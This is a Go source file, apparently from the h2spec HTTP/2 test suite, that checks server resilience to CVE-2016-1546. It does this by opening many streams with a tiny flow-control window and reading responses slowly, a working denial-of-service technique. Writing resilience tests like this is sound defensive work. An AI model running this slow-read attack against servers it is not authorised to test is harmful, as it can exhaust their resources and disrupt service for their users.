package sec

import (
	"fmt"
	"sync"
	"time"

	"github.com/summerwind/h2spec/config"
	"github.com/summerwind/h2spec/spec"
	"golang.org/x/net/http2"
)

func SlowRead() *spec.TestGroup {
	tg := NewTestGroup("CVE-2016-1546", "Slow Read")

	tg.AddTestCase(&spec.TestCase{
		Desc:        "Sends thousands of GET requests with small window size",
		Requirement: "HTTP/2 stream represents request-response cycles and once closed.",
		Run: func(c *config.Config, conn *spec.Conn) (err error) {
			var wg sync.WaitGroup

			ch := make(chan error)

			maxStreams := c.Requests
			concurrentStreams := c.Concurrency
			readStep := c.SlowReadStep
			readInterval := c.SlowReadInterval

			for {
				if err = conn.Handshake(); err != nil {
					return
				}

				settings := []http2.Setting{
					http2.Setting{
						ID:  http2.SettingInitialWindowSize,
						Val: readStep,
					},
				}

				if err = conn.WriteSettings(settings...); err != nil {
					return
				}

				if err = spec.VerifySettingsFrameWithAck(conn); err != nil {
					return
				}

				maxConcurrentStreams := int(conn.Settings[http2.SettingMaxConcurrentStreams])

				if maxStreams > 0 && maxConcurrentStreams > maxStreams {
					maxConcurrentStreams = maxStreams
				}

				if concurrentStreams > 0 && maxConcurrentStreams > concurrentStreams {
					maxConcurrentStreams = concurrentStreams
				}
				concurrentStreams -= maxConcurrentStreams

				wg.Add(1)
				go func(conn *spec.Conn) {
					defer wg.Done()

					ch <- func() (err error) {
						streamID := uint32(1)
						headers := spec.CommonHeaders(c)

						writeRequest := func(streamID uint32) error {
							hp := http2.HeadersFrameParam{
								StreamID:      streamID,
								EndStream:     false,
								EndHeaders:    true,
								BlockFragment: conn.EncodeHeaders(headers),
							}

							if err = conn.WriteHeaders(hp); err != nil {
								return err
							}

							return conn.WriteData(streamID, true, []byte("test"))
						}

						streams := make(map[uint32]int)

						for i := 0; i < maxConcurrentStreams; i++ {
							if err = writeRequest(streamID); err != nil {
								return
							}

							streams[streamID] = 0

							streamID += 2
						}

						var m sync.Mutex

						for !conn.Closed {
							event := conn.WaitEvent()

							switch actual := event.(type) {
							case spec.HeadersFrameEvent:
								// ignore
							case spec.WindowUpdateFrameEvent:
								// ignore

							case spec.DataFrameEvent:
								if actual.StreamEnded() {
									delete(streams, actual.StreamID)

									if int(streamID) < maxStreams*2+1 {
										m.Lock()
										err = writeRequest(streamID)
										m.Unlock()

										if err != nil {
											return err
										}

										streams[streamID] = 0

										streamID += 2
									}

									if len(streams) == 0 {
										return conn.Close()
									}
								} else {
									currentStreamID := actual.StreamID

									streams[currentStreamID] += len(actual.Data())

									go func() error {
										time.Sleep(readInterval)

										m.Lock()
										defer m.Unlock()

										return conn.WriteWindowUpdate(currentStreamID, readStep)
									}()
								}
							case spec.GoAwayFrameEvent:
								if actual.ErrCode != http2.ErrCodeNo {
									return &spec.TestError{
										Expected: []string{
											fmt.Sprintf("no more open streams %v", streams),
											fmt.Sprintf(spec.ExpectedGoAwayFrame, http2.ErrCodeNo),
										},
										Actual: actual.String(),
									}
								}

							default:
								return &spec.TestError{
									Expected: []string{
										fmt.Sprintf("no more open streams %v", streams),
										fmt.Sprintf(spec.ExpectedGoAwayFrame, http2.ErrCodeNo),
									},
									Actual: actual.String(),
								}
							}
						}

						return nil
					}()
				}(conn)

				if concurrentStreams <= 0 {
					break
				}

				if conn, err = spec.Dial(c); err != nil {
					return
				}
				defer conn.Close()
			}

			go func() {
				wg.Wait()

				close(ch)
			}()

			for {
				if err, ok := <-ch; ok {
					if err != nil {
						return err
					}
				} else {
					return nil
				}
			}
		},
	})

	return tg
}
